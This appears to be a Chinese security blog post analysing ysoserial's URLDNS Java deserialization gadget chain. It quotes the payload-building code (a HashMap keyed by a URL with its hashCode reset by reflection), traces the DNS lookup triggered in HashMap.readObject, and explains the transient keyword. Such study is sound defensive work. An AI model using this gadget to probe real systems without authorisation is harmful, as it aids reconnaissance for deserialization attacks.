+++
title = "Ysoserial-URLDNS"
publishDate = 2021-01-28T00:00:00+08:00
tags = ["java", "unserialize"]
draft = false
+++

<!--more-->

URLDNS 是一个比较简单的 POP 链，而且只能发送 DNS 请求，不能直接 RCE，所以本来是不想写这篇文章的。不过完整学习了这个链的代码后，发现 ysoserial 的一些代码和技巧对于深入了解 Java 十分有帮助，还是有必要记录一下。


## 构造 payload {#构造-payload}

URLDNS 链通过反序列化 HashMap 对象来触发，获取恶意对象的 getObject 方法如下：

```java
public Object getObject(final String url) throws Exception {

    //Avoid DNS resolution during payload creation
    //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
    URLStreamHandler handler = new SilentURLStreamHandler();

    HashMap ht = new HashMap(); // HashMap that will contain the URL
    URL u = new URL(null, url, handler); // URL to use as the Key
    ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

    //During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
    Reflections.setFieldValue(u, "hashCode", -1);

    return ht;
}
```

SilentURLStreamHandler 是一个静态内部类，继承 URLStreamHandler，并重写了 openConnection 和 getHostAddress 方法。

```java
static class SilentURLStreamHandler extends URLStreamHandler {

    protected URLConnection openConnection(URL u) throws IOException {
        return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
        return null;
    }
}
```

这个内部类的作用是用来避免漏洞误判，因为 payload 的构造过程中也会触发一次 DNS 请求，而我们希望 DNS 请求只在反序列化的过程中触发，以确定反序列化过程是否存在漏洞。

那 SilentURLStreamHandler 是怎么阻止第一次 DNS 请求的呢？我们跟进到 `ht.put(u, url)` 中：

{{< figure src="/ox-hugo/2021-01-28_17-28-18_screenshot.png" >}}

来到 `hashCode()` 方法，这里会对 hashCode 变量进行判断，如果不是 `-1` 的话会直接返回。因为 hashCode 的默认值就是 `-1` ，所以这里会调用 `handler.hashCode(this)` 。

注意此时的 handler 是 SilentURLStreamHandler 的实例。

{{< figure src="/ox-hugo/2021-01-28_17-39-27_screenshot.png" >}}

执行到上图的 359 行，调用 getHostAddress 方法，如果此时的 handler 是 URLStreamHandler 类的实例，则会发起 DNS 请求来获取 IP。

{{< figure src="/ox-hugo/2021-01-28_17-42-20_screenshot.png" >}}

然而此时执行的是 `SilentURLStreamHandler.getHostAddress` ，直接返回 null，避免了在反序列化前发送 DNS 请求。

{{< figure src="/ox-hugo/2021-01-28_17-46-37_screenshot.png" >}}

执行 `ht.put(u, url)` 之后，URL 对象的 hashcode 会被修改，前面说过如果 hashCode 不是-1，会在 `handler.hashCode(this)` 前返回，所以我们要将它重新设成-1。

{{< figure src="/ox-hugo/2021-01-28_17-53-18_screenshot.png" >}}

至此我们构造了一个 HashMap 的实例，并将一个 URL 类的实例设置为它的 key；value 则是我们输入的 url，实际上 value 对利用过程没有影响，只要是能被序列化的类就行。


## 反序列化过程 {#反序列化过程}

入口点和 [Hibernate1]({{< relref "ysoserial-hibernate1" >}}) 链一样，在 `HashMap.readObject` 中。在方法的最后，通过 for 循环获取每个 key 和 value，并调用了 `hash()` ：

{{< figure src="/ox-hugo/2021-01-28_18-09-48_screenshot.png" >}}

接下来的执行过程和前面 `ht.put(u, url)` 差不多，因为前面通过反射机制重置了 hashCode，所以仍然进入到 `handler.hashCode()` 中。

和之前一样执行到 getHostAddress 方法，但这次的 handler 并不是 SilentURLStreamHandler 的实例，因此顺利发送 DNS 请求。

{{< figure src="/ox-hugo/2021-01-28_18-13-48_screenshot.png" >}}


## transient 关键字 {#transient-关键字}

反序列化时，handler 变量并不是 SilentURLStreamHandler 的实例，是因为 `URL.handler` 变量是用 transient 关键字修饰的。

{{< figure src="/ox-hugo/2021-01-28_19-29-44_screenshot.png" >}}

当序列化一个实现了 Serilizable 接口的类实例时，用 transient 修饰的变量不会被序列化。在实际的开发中，经常会用 transient 修饰一些敏感的数据(密码、证件号等)，避免将这些数据序列化后通过网络传输。

以下示例代码使用 transient 修饰 User 类的 password 变量，序列化保存到文件后再反序列化获取 User 实例，此时输出的 password 为 null，因为该变量没有被序列化。

<details>
<summary>
示例代码
</summary>
<p class="details">

```java
public class demo {
    public static void main(String[] args) {
        User user = new User();
        user.setName("zrquan");
        user.setPassword("qwe123");

        //序列化
        try{
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("user.txt"));
            os.writeObject(user);
            os.flush();
            os.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        //反序列化
        try{
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("user.txt"));
            user = (User) is.readObject();
            is.close();

            System.out.println("After unserialized: ");
            System.out.println("username: " + user.getName());
            System.err.println("password: " + user.getPassword());
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }
}

class User implements Serializable {
    public String name;
    private transient String password;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
}
```
</p>
</details>

{{< figure src="/ox-hugo/2021-01-28_19-58-25_screenshot.png" >}}

💡 使用 transient 要注意以下几点：

1.  被修饰的变量将不再是对象持久化的一部分，该变量的值在序列化后无法获取。
2.  只能修饰变量，不能修饰方法和类。且本地变量不能被修饰，只能修饰实现了 Serializable 接口的类的成员变量。
3.  静态变量不管是否被 transient 修饰，都不能被序列化。
4.  transient 用来避免实现了 Serilizable 接口的类的变量被序列化，对实现 Externalizable 接口的类没有影响。
